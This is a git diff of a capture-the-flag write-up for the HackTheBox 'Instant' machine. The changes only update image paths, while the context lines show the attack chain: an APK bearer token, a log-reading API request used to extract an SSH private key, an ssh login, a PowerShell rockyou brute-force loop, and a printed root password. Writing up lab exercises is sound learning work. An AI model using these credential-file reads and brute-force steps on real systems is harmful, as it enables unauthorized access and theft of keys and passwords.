@@ -104,7 +104,7 @@ This webpage was empty, but a refresh get request in burp responded with a pytho
 ### APK download
 
 This file had a bearer token allowing me to authorize to the `/apidocs/`, which revealed some api stuff that you can see in the image below:
-![alt text](image.png)
+![alt text](assets/instan/instant1.png)
  This get request responded with the following:
 ```json
 Response body
@@ -161,7 +161,7 @@ curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=.
 | sed '/^$/d' > id_rsa
 ```
 This fixed the whole key as you can see:
-![alt text](image-1.png)
+![alt text](assets/instant/instant2.png)
 Used `chmod 600` to give the key the right permissions and logged in with ssh
 ```
 ssh -i id_rsa shirohige@10.10.11.37
@@ -202,9 +202,9 @@ Get-Content $filePath | ForEach-Object {
     & $exePath $datFile $line
 }
 ```
-![alt text](image-2.png)
+![alt text](assets/instant/instant3.png)
 As you can see in the image it scrolled very fast through the rockyou.txt password list and then it would create  a file with the decrypted key. 
-![alt text](image-3.png)
+![alt text](assets/instant/instant4.png)
 The passwords is:
 ```
 Username: root
@@ -212,4 +212,4 @@ Password: 12**24nzC!r0c%q12
 ```
 
 Now with a simple `su root` with that password gives you root on the ssh connection., 
-![alt text](image-4.png)
+![alt text](assets/instant/instant5.png)
